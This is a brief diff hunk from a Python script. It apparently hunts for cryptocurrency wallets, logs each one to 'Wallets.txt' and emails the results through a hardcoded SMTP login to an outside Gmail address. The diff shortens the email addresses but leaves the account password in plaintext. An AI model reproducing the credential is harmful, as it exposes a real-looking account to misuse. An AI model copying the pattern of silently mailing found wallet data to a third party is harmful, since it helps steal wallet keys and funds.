@@ -63,9 +63,9 @@ def seek(r):
 					server = smtplib.SMTP("mail.remittancetoken.io", 587)
 					server.ehlo()
 					server.starttls()
-					server.login("hello@remittancetoken.io", "Nns#@31}%hsdD35gh")
-					fromaddr = "hello@remittancetoken.io"
-					toaddr = "batataprodz@gmail.com"
+					server.login("hello@", "Nns#@31}%hsdD35gh")
+					fromaddr = "hello@"
+					toaddr = "batataprodz@"
 					server.sendmail(fromaddr, toaddr, text)
 					print(text)
 					f = open('Wallets.txt','a')
